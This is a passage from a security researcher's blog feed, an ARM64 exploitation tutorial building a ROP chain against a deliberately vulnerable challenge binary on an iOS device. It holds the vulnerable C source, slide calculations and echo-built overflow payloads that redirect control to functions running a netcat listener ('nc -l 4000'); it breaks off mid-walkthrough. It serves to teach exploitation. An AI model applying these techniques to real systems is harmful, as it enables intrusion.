<!DOCTYPE html>
<html class="direction--ltr"lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Prateekg147 | I am Prateek Gianchandani. Currently i am working as a Security Researcher in UAE. I have interests in Exploit Development, Mobile and Browser Security.</title>
<meta name="generator" content="Jekyll v4.3.1" />
<meta property="og:title" content="Prateekg147" />
<meta name="author" content="Prateek Gianchandani" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="I am Prateek Gianchandani. Currently i am working as a Security Researcher in UAE. I have interests in Exploit Development, Mobile and Browser Security." />
<meta property="og:description" content="I am Prateek Gianchandani. Currently i am working as a Security Researcher in UAE. I have interests in Exploit Development, Mobile and Browser Security." />
<link rel="canonical" href="https://bitbrain.github.io/atom.xml" />
<meta property="og:url" content="https://bitbrain.github.io/atom.xml" />
<meta property="og:site_name" content="Prateekg147" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Prateekg147" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","author":{"@type":"Person","name":"Prateek Gianchandani"},"description":"I am Prateek Gianchandani. Currently i am working as a Security Researcher in UAE. I have interests in Exploit Development, Mobile and Browser Security.","headline":"Prateekg147","url":"https://bitbrain.github.io/atom.xml"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" />
  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://bitbrain.github.io/feed.xml" title="Prateekg147" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
  <script src="/assets/js/jquery.magnific-popup.js"></script>
</head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">Prateekg147<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        
        
        <a class="color-cyan-hover" href="https://twitter.com/prateekg147"><i class="fab fa-twitter-square"></i></a>
        
        
        
        <a class="color-blue-hover" href="https://www.linkedin.com"><i class="fab fa-linkedin-square"></i></a>
        
        
        
        <a class="color-yellow-hover" href="https://github.com/prateek147"><i class="fab fa-github-square"></i></a>
        
        
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

 <title>Prateekg147</title>
 <link href="https://bitbrain.github.io/atom.xml" rel="self"/>
 <link href="https://bitbrain.github.io/"/>
 <updated>2022-12-21T01:13:56+00:00</updated>
 <id>https://bitbrain.github.io</id>
 <author>
   <name></name>
   <email></email>
 </author>

 
 <entry>
   <title>ARM64 Reversing and Exploitation Part 3 - A Simple ROP Chain</title>
   <link href="https://bitbrain.github.io/2020/09/06/arm64-reversing-and-exploitation-part-3-a-simple-rop-chain.html"/>
   <updated>2020-09-06T09:31:00+00:00</updated>
   <id>https://bitbrain.github.io/2020/09/06/arm64-reversing-and-exploitation-part-3-a-simple-rop-chain</id>
   <content type="html">&lt;p&gt;Return-oriented programming (ROP) allows an attacker to execute code in the presence of security defenses such as executable space protection and code signing using ROP Gadgets.
More details about ROP can be found &lt;a href=&quot;https://en.wikipedia.org/wiki/Return-oriented_programming#:~:text=Return%2Doriented%20programming%20(ROP),space%20protection%20and%20code%20signing. &quot;&gt;here&lt;/a&gt;. In this blog post, we will be writing a ROP Chain for the &lt;em&gt;rop&lt;/em&gt; binary. The binaries for this article can be found &lt;a href=&quot;https://drive.google.com/file/d/1f3PDEz-Fh9I3rSDhpMGW5ZrCU9g0BjKL/view?usp=sharing&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Your task here is to call the function &lt;em&gt;chain1&lt;/em&gt; followed by &lt;em&gt;chain2&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;SSH to your Corellium or iOS device and run the rop binary&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;$ rop&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Run the rop command&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;./rop&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/12.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;Nothing much happnes, however on reversing the main function, we find that it also accepts an extra argument and tries to open a file with the name &lt;strong&gt;hax.bin&lt;/strong&gt; if it gets that argument (argument could be anything). &lt;strong&gt;arg0 = argc&lt;/strong&gt; here which is 2 if one argument is passed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/13.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Sure enough, that’s what is happening if we look at the code.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Address of main function is %p&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ROP chain challenge, call the function chain1 followed by chain2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hax.bin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;fseek&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SEEK_END&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ftell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;fseek&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SEEK_SET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;fread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hello %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;As mentioned in the challenge, our task is to call the function &lt;strong&gt;chain1&lt;/strong&gt; followed by &lt;strong&gt;chain2&lt;/strong&gt;. Calling these functions in a chain will open a netcat listener on the device on port 4000.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;my_strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;chain1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Executing first chain.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;my_strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;nc -l 4000&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;chain2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Executing second chain.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Anothing thing we must be aware of is the slide. The slide is essentially a random value added to the start address of the binary to make sure all the addresses are slid. This program has a deliberate information leak where it dumps out the address of the main function. We can find the slide by subtracting this address of the main function in the running binary and the address of the main function in Hopper.&lt;/p&gt;

&lt;p&gt;let’s run the binary again with a random argument.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/14.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The address of the main function is 0x102693d50&lt;/p&gt;

&lt;p&gt;and the address in the binary is 0x100007d50&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/27.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can find the slide by subtracting the addresses. You can use python or any hex calculator (for e.g https://www.calculator.net/hex-calculator.html) to subtract these addresses&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x102693d50&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100007d50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x268c000&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;So the slide in this case is 0x268c000. Using this, we can find the actual address of the &lt;strong&gt;chain1&lt;/strong&gt; and the &lt;strong&gt;chain2&lt;/strong&gt; function. We just need to add the slide to their addresses.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;It is important to note that the slide on each run will be different.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The idea here is to keep entering input that would overwrite the lr (link register). After some attempts, we find that the following input overwrites the lr (link register) by CCCCCCCC which is \x43\x43\x43\x43\x43\x43\x43\x43.&lt;/p&gt;

&lt;p&gt;Create a &lt;strong&gt;hax.bin&lt;/strong&gt; file in the same folder using the below command.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ne&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x43\x43\x43\x43\x43\x43\x43\x43&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bin&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/15.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Run the rop binary again and press enter after entering any input. It will read the input from the hax.bin file we just created and crash.&lt;/p&gt;

&lt;p&gt;Now we need to look at the crash logs. There are a couple of ways to look at them.&lt;/p&gt;

&lt;p&gt;a) On your device , go to &lt;strong&gt;Settings -&amp;gt; Privacy -&amp;gt; Analytics and Improvements -&amp;gt; Analytics data&lt;/strong&gt; and look at the latest crash log for the rop binary (the crash log with the highest number is the latest one)&lt;/p&gt;

&lt;p&gt;We can see that the lr register is overwritten by 4343434343434343 which is all C&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/16.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;c) Another way is to look via Xcode if your device is connected to your laptop by going to &lt;strong&gt;Window -&amp;gt; Devices and Simulators -&amp;gt; Select your device on the left and click on Logs&lt;/strong&gt;
&lt;img src=&quot;/images/posts/arm/17.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;c) Another way is to use the command line utility &lt;strong&gt;idevicecrashreport&lt;/strong&gt;. Make sure you have the package libimobiledevice installed on your laptop.&lt;/p&gt;

&lt;p&gt;Run the command &lt;strong&gt;idevicecrashreport .&lt;/strong&gt; to move the crash logs to your computer and analyze them.&lt;/p&gt;

&lt;p&gt;Anyways, so it’s pretty clear what we need to do. We need to overwrite the final part of the payload which is \x43\x43\x43\x43\x43\x43\x43\x43 with the address of the chain1 function. However, there is a tricky part here. On ARM64, the value of lr (x30) register is first stored on the stack and then taken off the stack. See image below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/18.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We need to be able to control the x30 register (which is link register) once the function chain1 finishes execution. There seems to be no way to do that right now.&lt;/p&gt;

&lt;p&gt;However, if we jump to the second instruction of chain1 function , we can trick the function into loading another value from the stack which might be controllable by us. Ofcourse, this is going to misalign the stack but we purposely want to misalign the stack in order to be able to pop next return address (x30) from the stack, which we can control, since we can smash the stack upwards as much as we want.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/19.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So to jump to the second instruction , whose address is 0x100007cdc in the binary, we need to first find the slid address in the binary by adding the slide.&lt;/p&gt;

&lt;p&gt;Let’s run the binary again, this time the address of main function is 0x10023bd50 , which means the slide is calculated below&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/21.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10023bd50&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100007d50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x234000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Slid address of the second instruction of chain1 =&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100007cdc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x234000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10023bcdc&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000000010023bcdc&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Let’s put this in our payload&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ne&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xdc\xbc\x23\x00\x01\x00\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bin&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Remove any previous hax.bin file also if any and create a new one as shown below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/20.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Press enter on the running rop binary and you will see that the first chain gets executed. Nice, we are halfway there. Now we need to find a way to execute chain2 function.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/22.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we need to keep entering our payloads until we overwrite the lr again. We can then change the lr again to point to chain2 function.&lt;/p&gt;

&lt;p&gt;After testing several times we come up with the following payload using which we are able to overwrite lr register again.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ne&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x42\x42\x42\x42\x42\x42\x42\x42\x46\x46\x46\x46\x46\x46\x46\x46\x48\x48\x48\x48\x48\x48\x48\x48&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bin&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ul&gt;
  &lt;li&gt;/x41 is the initial junk&lt;/li&gt;
  &lt;li&gt;/x42 should point to the initial lr register which we should set to the second instruction of the chain1 function&lt;/li&gt;
  &lt;li&gt;/x46 is junk as well&lt;/li&gt;
  &lt;li&gt;/x48 should point to the chain2 function&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ok, will all this information in place, we are now able to write our rop chain again.&lt;/p&gt;

&lt;p&gt;Let’s run the program again. Address of main function is 0x1008b3d50 this time.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/23.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;slide&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1008b3d50&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100007d50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x8ac000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

